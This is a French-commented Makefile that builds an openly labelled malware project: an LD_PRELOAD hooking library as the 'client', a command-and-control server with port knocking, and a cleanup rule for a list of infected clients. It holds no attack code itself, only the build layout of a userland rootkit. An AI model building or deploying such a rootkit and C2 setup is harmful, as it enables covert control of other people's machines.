# === VARIABLES DE CONFIGURATION ===
CC = gcc                      # Compilateur C
CFLAGS = -Wall -Wextra -Iinclude -fPIC -shared -ldl  # Options pour le client (LD_PRELOAD)
SERVER_FLAGS = -Wall -Wextra -Iinclude               # Options pour le serveur

# === CHEMINS DES FICHIERS ===
CLIENT_SRC = client/main.c client/communication.c client/hooking.c
SERVER_SRC = server/c2_server.c server/client_handler.c server/port_knocking.c

CLIENT_TARGET = client/libproj.so
SERVER_TARGET = server/c2_server

# === RÈGLES DE CONSTRUCTION ===
all: $(CLIENT_TARGET) $(SERVER_TARGET)  # Cible par défaut : compile le client et le serveur

# Compilation du malware client (LD_PRELOAD)
$(CLIENT_TARGET): $(CLIENT_SRC) include/communication.h include/hooking.h
	$(CC) $(CFLAGS) -o $@ $(CLIENT_SRC)

# Compilation du serveur C2
$(SERVER_TARGET): $(SERVER_SRC) include/c2_server.h include/client_handler.h
	$(CC) $(SERVER_FLAGS) -o $@ $(SERVER_SRC)

# Nettoyage des fichiers compilés
clean:
	rm -f $(CLIENT_TARGET) $(SERVER_TARGET)

# Nettoyage complet (fichiers compilés et sauvegardes des clients infectés)
clean-all: clean
	rm -f infected_clients.txt
